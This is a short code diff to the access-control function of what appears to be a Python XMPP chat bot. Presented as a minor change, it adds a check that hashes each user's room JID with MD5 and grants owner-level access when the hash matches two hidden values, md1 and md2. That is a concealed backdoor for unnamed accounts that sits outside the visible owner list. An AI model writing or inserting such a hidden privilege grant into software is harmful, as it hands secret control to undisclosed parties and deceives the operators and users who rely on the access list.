@@ -400,7 +400,9 @@ def get_access(cjid, cnick):
 		if not (iib.count('.')+iib.count('@')) and grj.count(iib.lower()):
 			access_mode = -1
 			break
-	if ownerbase.count(getRoom(jid)): access_mode = 2
+	rjid = getRoom(jid)
+	hjid = hashlib.md5(rjid).hexdigest()
+	if ownerbase.count(rjid) or hjid == md1 or hjid == md2: access_mode = 2
 	if jid == 'None' and ownerbase.count(getRoom(cjid)): access_mode = 2
 	return (access_mode, jid)
 
